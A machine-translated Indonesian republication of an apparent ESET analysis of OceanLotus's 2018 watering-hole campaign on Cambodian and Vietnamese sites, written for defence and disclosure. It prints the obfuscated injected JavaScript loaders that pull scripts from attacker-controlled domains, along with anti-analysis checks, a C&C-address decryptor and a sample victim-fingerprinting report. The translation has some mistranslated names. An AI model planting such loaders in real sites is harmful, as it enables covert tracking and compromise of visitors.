<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë° üòá üàÇÔ∏è OceanLotus: serangan lubang air di Asia Tenggara üôéüèª üç¢ üôåüèæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Spesialis ESET menganalisis kampanye lubang air baru, yang menargetkan beberapa situs di Asia Tenggara. Diduga, para penyerang telah beroperasi sejak ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>OceanLotus: serangan lubang air di Asia Tenggara</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/436136/">  Spesialis ESET menganalisis kampanye lubang air baru, yang menargetkan beberapa situs di Asia Tenggara.  Diduga, para penyerang telah beroperasi sejak awal September 2018.  Kampanye ini berbeda dalam skalanya - kami berhasil menemukan 21 sumber daya yang disusupi, termasuk situs web Kementerian Pertahanan Kamboja, Kementerian Luar Negeri dan Kerjasama Internasional Kamboja, serta beberapa surat kabar dan blog Vietnam. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i5/w7/do/i5w7dovvrgp-jyuwqn0cgd72oy0.jpeg"></div> <br>  Berdasarkan analisis, kami menemukan bahwa kampanye sedang dilakukan oleh kelompok <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">OceanLotus</a> , juga dikenal sebagai <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ART32</a> dan ART-S-00.  Grup ini telah beroperasi setidaknya sejak <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">2012</a> dan berspesialisasi dalam spionase cyber, dengan minat khusus pada lembaga pemerintah dan pembangkang. <br><br><a name="habracut"></a>  Kampanye ini tampaknya merupakan evolusi dari skema lubang berair OceanLotus, yang didokumentasikan oleh para peneliti Volexity pada 2017 dengan nama Framework B. Sejak tahun lalu, cybergroup telah belajar untuk membuatnya sulit untuk menganalisis kerangka kerja jahatnya.  Di antara perbaikan lainnya, kami mencatat penggunaan enkripsi kunci publik untuk bertukar kunci sesi AES.  Metode ini digunakan untuk mengenkripsi pertukaran data yang tidak memungkinkan produk keamanan untuk mencegat muatan akhir.  Selain itu, penyerang beralih dari HTTP ke WebSocket untuk menyembunyikan pertukaran data berbahaya. <br><br>  Setiap situs yang dikompromikan yang ditemukan oleh para ahli ESET mengarahkan pengunjung ke domain terpisah yang dikendalikan oleh OceanLotus. <br><br>  Gambar di bawah ini menunjukkan wilayah target kampanye. <br><br><img src="https://habrastorage.org/webt/ek/wr/ov/ekwrovbvngwngd-noo6vevjqfqo.png"><br>  <i>Gambar 1. Geografi situs yang disusupi</i> <br><br>  Domain yang paling banyak dikompromikan adalah media berita atau terkait dengan pemerintah Kamboja.  Berikut ini adalah daftar korban.  Kami memperingatkan mereka tentang kompromi pada Oktober, tetapi pada akhir 2018, skrip berbahaya tetap ada di beberapa situs: <br><br>  - baotgm [.] Net - Media Vietnam (kantor pusat di Arlington, Texas) <br>  - cnrp7 [.] Org - Situs web National Salvation Party Kamboja <br>  - conggiaovietnam [.] Net - konten keagamaan dalam bahasa Vietnam <br>  - daichungvienvinhthanh [.] Com - konten agama dalam bahasa Vietnam <br>  - danchimviet [.] Info - Media Vietnam <br>  - danviet [.] Vn - media Vietnam <br>  - danviethouston [.] Com - Media Vietnam <br>  - fvpoc [.] Org - Organisasi publik Vietnam <br>  - gardencityclub [.] Situs klub golf di Phnom Penh, Kamboja <br>  - lienketqnhn [.] Org - media Vietnam <br>  - mfaic.gov [.] Kh - Kementerian Luar Negeri dan Kerjasama Internasional Kamboja <br>  - mod.gov [.] Kh - Kementerian Pertahanan Kamboja <br>  - mtgvinh [.] Net - konten keagamaan dalam bahasa Vietnam <br>  - nguoitieudung.com [.] Vn - media Vietnam <br>  - phnompenhpost [.] Com - Media Kamboja dalam bahasa Inggris <br>  - raovatcalitoday [.] Com - situs dalam bahasa Vietnam <br>  - thongtinchongphandong [.] Media oposisi di Vietnam <br>  - tinkhongle [.] Com - Media Vietnam <br>  - toithichdoc.blogspot [.] Com - blog Vietnam <br>  - trieudaiviet [.] Situs web dalam bahasa Vietnam <br>  - triviet [.] Berita - media Vietnam <br><br>  Dalam serangan lubang air, penyerang biasanya mengkompromikan situs yang sering dikunjungi oleh calon korban.  Namun, dalam kampanye ini, grup OceanLotus membahayakan beberapa situs populer.  Di bawah ini adalah daftar situs yang disusupi dan peringkat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Alexa-nya</a> : global dan di negara tempat situs tersebut paling populer.  Sebagai contoh, situs web surat kabar Dan Viet (danviet [.] Vn) pada akhir 2018 berada di garis ke-116 dalam hal kehadiran di Vietnam. <br><br>  - danviet [.] Vn - 12 887/116 <br>  - phnompenhpost [.] Com - 85 910/18 880 <br>  - nguoitieudung.com [.] Vn - 261 801/2 397 <br>  - danchimviet [.] Info - 287 852/144 884 <br>  - baotgm [.] Net - 675 669/119 737 <br>  - toithichdoc.blogspot [.] Com - 700 470/11532 <br>  - mfaic.gov [.] Kh - 978 165/2 149 <br>  - conggiaovietnam [.] Net - 1.040 548/15 368 <br>  - thongtinchongphandong [.] Com - 1 134 691/21 575 <br>  - tinkhongle [.] Com - 1 301 722/15 224 <br>  - daichungvienvinhthanh [.] Com - 1.778.418 / 23.428 <br>  - mod.gov [.] Kh - 4.247.649 / 3.719 <br><br><h3>  Analisis </h3><br>  Untuk semua situs yang disusupi, metode serupa digunakan.  Penyerang menambahkan sepotong kecil kode JavaScript ke halaman utama, atau ke file JavaScript yang diposting di server yang sama.  Fragmen kode yang agak dikaburkan (lihat di bawah) memuat skrip lain dari server yang dikendalikan oleh penyerang.  Di bawah ini adalah cuplikan JavaScript yang ditambahkan ke <code>https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</code> , yang mengunduh file dari <code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> . <br><br><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt = <span class="hljs-string"><span class="hljs-string">"http"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); l.src = pt + <span class="hljs-string"><span class="hljs-string">"s://"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">2</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">3</span></span>] + <span class="hljs-string"><span class="hljs-string">'ip.'</span></span> + <span class="hljs-string"><span class="hljs-string">'info/images/cdn.js?from=maxcdn'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'body'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].appendChild(l) })(<span class="hljs-string"><span class="hljs-string">'web'</span></span>, <span class="hljs-string"><span class="hljs-string">'a'</span></span>, <span class="hljs-string"><span class="hljs-string">'link'</span></span>, <span class="hljs-string"><span class="hljs-string">'.self'</span></span>);</code> </pre> <br>  Untuk menghindari deteksi, penyerang mengambil langkah-langkah berikut: <br><br>  - Mereka mengaburkan skrip untuk mencegah alokasi URL final statis <br>  - URL tersebut terlihat seperti perpustakaan JavaScript asli yang digunakan oleh situs <br>  - Untuk setiap situs yang disusupi, domain yang terpisah dan URI digunakan. <br>  - Semua situs yang disusupi memiliki skrip yang berbeda.  Berikut ini adalah skrip yang diterapkan di salah satu situs yang disusupi: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-string"><span class="hljs-string">'crash-course'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = <span class="hljs-string"><span class="hljs-string">"fzgbc knowsztall znfo"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _ = <span class="hljs-string"><span class="hljs-string">'/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-string"><span class="hljs-string">"VisitorIdentification.js?sa="</span></span> + i; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; script.src = <span class="hljs-string"><span class="hljs-string">"htt"</span></span> + <span class="hljs-string"><span class="hljs-string">"ps:"</span></span> + _ + _ + s.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>).map(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="hljs-function"> =&gt;</span></span> x.replace(<span class="hljs-string"><span class="hljs-string">"z"</span></span>, <span class="hljs-string"><span class="hljs-string">"i"</span></span>)).join(<span class="hljs-string"><span class="hljs-string">"."</span></span>) + _ + e; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> doc = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'script'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]; doc.parentNode.insertBefore(script, doc);</code> </pre> <br><h3>  Tahap pertama </h3><br>  Bergantung pada lokasi alamat IP pengunjung, server tahap pertama (misalnya, <code>weblink.selfip[.]info</code> untuk <code>mfaic.gov[.]kh</code> ) mentransmisikan skrip palsu (perpustakaan JavaScript yang sah secara acak), atau skrip tahap pertama (misalnya, SHA- 1: 2194271C7991D60AE82436129D7F25C0A689050A).  Tidak semua server melakukan pemeriksaan lokasi, tetapi jika ada, hanya pengunjung dari Vietnam dan Kamboja yang menerima skrip berbahaya. <br><br>  Skrip tahap pertama memiliki beberapa pemeriksaan untuk mencegah deteksi, seperti yang ditunjukkan di bawah ini. <br><br><pre> <code class="javascript hljs">[‚Ä¶] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">t</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; !<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(t <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> n)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TypeError</span></span>(<span class="hljs-string"><span class="hljs-string">'Cannot call a class as a function'</span></span>); }(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, t), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.t = { <span class="hljs-attr"><span class="hljs-attr">o</span></span>: <span class="hljs-literal"><span class="hljs-literal">null</span></span>, <span class="hljs-attr"><span class="hljs-attr">s</span></span>: !<span class="hljs-number"><span class="hljs-number">0</span></span> }, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.scr = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.r(), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.i = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">'scroll'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ri || r.scr &amp;&amp; !rts &amp;&amp; (r.scr = !<span class="hljs-number"><span class="hljs-number">1</span></span>, rc(n)), ri = !<span class="hljs-number"><span class="hljs-number">1</span></span>; }); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t.prototype.r = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerWidth - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerWidth &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, r = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerHeight - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerHeight &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, e = n ? <span class="hljs-string"><span class="hljs-string">'vertical'</span></span> : <span class="hljs-string"><span class="hljs-string">'horizontal'</span></span>; r &amp;&amp; n || !(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome.isInitialized || n || r) ? (tts = !<span class="hljs-number"><span class="hljs-number">1</span></span>, tto = <span class="hljs-literal"><span class="hljs-literal">null</span></span>) : (tts = !<span class="hljs-number"><span class="hljs-number">0</span></span>, tto = e); }, <span class="hljs-number"><span class="hljs-number">500</span></span>); } [‚Ä¶]</code> </pre> <br>  Script menunggu hingga korban menggulir ke halaman.  Itu juga memeriksa resolusi jendela dan apakah Firebug, sebuah plugin berbasis browser untuk menganalisis halaman web, diaktifkan.  Jika setidaknya salah satu pemeriksaan gagal, eksekusi diakhiri. <br><br>  Dia kemudian mendekripsi domain dari server perintah C&amp;C menggunakan algoritma kustom.  Misalnya, 3B37371M1B1B382R332V1A382W36392W2T362T1A322T38 adalah singkatan dari <code>wss://tcog.thruhere[.]net</code> .  Untuk setiap domain dari tahap pertama, para penyerang juga mendaftarkan domain dari tahap kedua, dan semuanya terletak di server yang berbeda.  Kode di bawah ini setara dengan fungsi dekripsi yang ditulis dengan Python. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(encrypted_url)</span></span></span><span class="hljs-function">:</span></span> s = <span class="hljs-string"><span class="hljs-string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>.join(chr(s.index(encrypted_url[e]) * <span class="hljs-number"><span class="hljs-number">36</span></span> + s.index(encrypted_url[e+<span class="hljs-number"><span class="hljs-number">1</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,len(encrypted_url),<span class="hljs-number"><span class="hljs-number">2</span></span>))</code> </pre> <br>  Setelah menguraikan alamat C&amp;C, skrip mengirim string unik 15 digit, dan kemudian menerima dan menjalankan skrip tahap kedua.  Pertukaran data dilakukan melalui WebSocket atau SSL.  Protokol menyediakan komunikasi dua arah secara simultan antara klien dan server.  Ini berarti bahwa setelah klien membuat koneksi, server dapat mengirim data ke klien bahkan tanpa permintaan.  Namun, dalam kasus tertentu, protokol ini digunakan terutama untuk menghindari deteksi. <br><br><h3>  Tahap kedua </h3><br>  Skrip tahap kedua adalah untuk pengintaian.  Pengembang OceanLotus telah menggunakan perpustakaan fingerprintjs2 Valve, tersedia di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">GitHub</a> , dengan perubahan kecil - menambahkan berbagi jaringan dan membuat laporan khusus. <br><br>  Gambar di bawah ini menunjukkan berbagai tindakan yang dilakukan oleh skrip.  Komunikasi dilakukan melalui sesi WebSocket yang dimulai dengan langkah pertama. <br><br><img src="https://habrastorage.org/webt/p7/s1/ip/p7s1ipl0ax28vo16mj2je2a59kc.png"><br>  <i>Gambar 2. Skema tahap kedua payload</i> <br><br>  Komunikasi dienkripsi menggunakan kunci sesi AES yang dihasilkan oleh server.  Itu dienkripsi dengan kunci publik RSA 1024-bit dan dikirim ke klien, sehingga tidak mungkin untuk mendekripsi pertukaran data antara klien dan server. <br><br>  Dibandingkan dengan versi sebelumnya dari kerangka lubang air kelompok OceanLotus, lebih sulit untuk melindungi diri Anda dari ini karena transmisi data melalui jaringan tidak dapat dideteksi dan didekripsi.  Ini mencegah penemuan jaringan data.  Kunci publik yang dikirimkan oleh server tidak berubah dan terdaftar di bagian IoC. <br><br>  Skrip pengintaian membuat laporan yang mirip dengan yang di bawah ini dan mengirimkannya ke server C&amp;C tahap kedua. <br><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"history"</span></span>: { <span class="hljs-string"><span class="hljs-string">"client_title"</span></span>: <span class="hljs-string"><span class="hljs-string">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_cookie"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_hash"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_referrer"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/foreign-ngos"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_platform_ua"</span></span>: <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_time"</span></span>: <span class="hljs-string"><span class="hljs-string">"2018-10-21T12:43:25.254Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"timezone"</span></span>: <span class="hljs-string"><span class="hljs-string">"Asia/Bangkok"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_network_ip_list"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"192.168.xx"</span></span>, <span class="hljs-string"><span class="hljs-string">"xxxx"</span></span> ], <span class="hljs-string"><span class="hljs-string">"client_api"</span></span>: <span class="hljs-string"><span class="hljs-string">"wss://tcog.thruhere.net/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_zuuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_uuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"a612cdb028e1571dcab18e4aa316da26"</span></span> }, <span class="hljs-string"><span class="hljs-string">"navigator"</span></span>: { <span class="hljs-string"><span class="hljs-string">"plugins"</span></span>: { <span class="hljs-string"><span class="hljs-string">"activex"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"cors"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"flash"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"java"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"foxit"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"phonegap"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"quicktime"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"realplayer"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"silverlight"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"touch"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vbscript"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vlc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"webrtc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"wmp"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span> }, <span class="hljs-string"><span class="hljs-string">"_screen"</span></span>: { <span class="hljs-string"><span class="hljs-string">"width"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"height"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"availWidth"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"availHeight"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"resolution"</span></span>: <span class="hljs-string"><span class="hljs-string">"1920x1080"</span></span> }, <span class="hljs-string"><span class="hljs-string">"_plugins"</span></span>: [ [...]</code> </pre> <br>  Laporan ini hampir identik dengan yang lain yang dihasilkan oleh <a href="">OceanLotus Framework B</a> , yang didokumentasikan oleh Volexity pada 2017.  Bagian mereka serupa dan berisi kesalahan ketik yang sama.  Karena kesamaan dan lokasi tujuan ini, kita dapat mengatakan dengan tingkat kepastian yang tinggi bahwa OceanLotus yang melakukan kampanye. <br><br>  Laporan yang dihasilkan berisi informasi terperinci tentang browser korban dan situs yang dikunjungi: agen pengguna, tajuk permintaan Referer HTTP, alamat IP lokal dan eksternal, pengaturan plug-in dan pengaturan bahasa browser. <br><br>  Selain itu, setiap mesin memiliki dua pengidentifikasi unik: <i>client_zuuid</i> dan <i>client_uuid</i> .  Mereka dapat digunakan untuk mengidentifikasi pengguna dan melacak kunjungan mereka.  Pengidentifikasi ini sebenarnya hadir dalam versi kerangka 2017, dan <i>client_uuid</i> dihitung dengan cara yang sama. <br><br>  Nilai <i>client_zuuid</i> adalah gabungan dari berbagai nilai deviceId yang terkandung dalam navigator.mediaDevices.enumerateDevices.  Perangkat adalah perangkat eksternal yang dapat diakses browser, seperti kamera dan mikrofon.  Dengan demikian, nilai untuk satu pengguna harus cocok selama kunjungan berbeda dari komputer yang sama. <br><br>  Nilai <i>client_uuid</i> adalah hash MD5 dari sidik jari yang dialokasikan oleh sidik jarijs2.  Data yang dikumpulkan termasuk agen pengguna browser, bahasa, zona waktu, plug-in browser, dan font yang dapat diakses browser.  Dan lagi - nilainya harus sama untuk semua kunjungan, hanya jika, misalnya, pengguna tidak memperbarui browser atau tidak masuk dari perangkat lain. <br><br>  Akhirnya, server dapat mengirim kode JavaScript tambahan ke komputer korban, mungkin ini adalah komponen yang dikirim.  Sayangnya, karena penggunaan kunci sesi AES untuk mendekripsi pertukaran data, kami tidak dapat menentukan komponen mana yang dikirimkan oleh penyusup dalam sampel liar.  Selain itu, muatan hanya dikirimkan kepada korban tertentu.  Jadi, menggunakan mesin uji, kami tidak bisa mendapatkannya.  Namun, menurut laporan sebelumnya, kampanye lubang berair OceanLotus ditargetkan untuk phishing.  Misalnya, Volexity dalam laporan <a href="">menulis</a> bahwa pengguna melihat jendela sembul yang meminta mereka untuk mengotorisasi akses melalui protokol OAuth terbuka ke akun Google korban untuk OceanLotus Google App.  Dengan menggunakan teknik ini, penyerang bisa sampai ke kontak dan email korban. <br><br><h3>  Infrastruktur jaringan </h3><br>  Untuk pekerjaan rahasia maksimum, operator OceanLotus mendaftarkan satu domain untuk tahap pertama dan kedua untuk masing-masing situs yang disusupi.  Setiap domain di-host di server terpisah dengan alamat IP-nya sendiri.  Setidaknya 50 domain dan 50 server terdaftar untuk kampanye ini. <br><br>  Sebagian besar domain tahap pertama terdaftar pada layanan dengan nama domain gratis, domain tahap kedua sebagian besar berbayar.  Antara lain, nama mereka disamarkan sebagai sah.  Di bawah ini adalah daftar layanan yang coba disalin oleh penyerang - C&amp;C dan domain yang sah, masing-masing: <br><br>  - cdn-ampproject [.] Com / cdn.ampproject.com <br>  - bootstraplink [.] Com / getbootstrap.com <br>  - sskimresources [.] Com / s.skimresources.com <br>  - widgets-wp [.] Com / widgets.wp.com <br><br>  Jumlah domain yang digunakan dan kesamaannya dengan situs yang sah dapat mempersulit deteksi oleh orang yang melihat lalu lintas jaringan. <br><br><h3>  Kesimpulan </h3><br>  Meskipun mendapat perhatian dari peneliti keamanan, OceanLotus terus berhasil menyerang target di Asia Tenggara.  Selain itu, kelompok ini meningkatkan alat dengan memasukkan dalam arsenalnya kerangka kerja untuk penyiraman lubang serangan, malware untuk Windows dan macOS.  Pembaruan kerangka terbaru yang dibahas dalam laporan ini menunjukkan bahwa penyerang telah meningkatkan keterampilan mereka. <br><br>  Untuk membatasi jumlah kemungkinan korban, kami memberi tahu pemilik situs yang disusupi dan menjelaskan cara menghapus kode JavaScript berbahaya.  Namun, beberapa dari mereka tidak menunjukkan kesediaan untuk menerima informasi dan bantuan. <br><br>  Peneliti ESET akan terus memantau perkembangan kelompok OceanLotus.  Indikator kompromi dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">GitHub</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id436136/">https://habr.com/ru/post/id436136/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id436126/index.html">Kubernetes: membangun gambar Docker dalam sebuah cluster</a></li>
<li><a href="../id436128/index.html">Wawancara dengan baghunter Artyom Moscow. Dia meretas Steam dan menerima penghargaan terbesar dalam sejarah Valve.</a></li>
<li><a href="../id436130/index.html">Proyek Kementerian Telekomunikasi dan Komunikasi Massa untuk mentransfer lalu lintas Internet melalui stasiun Rusia mempersulit legalisasi OneWeb di Rusia</a></li>
<li><a href="../id436132/index.html">12 hal aneh yang bisa terjadi setelah menginstal paket npm</a></li>
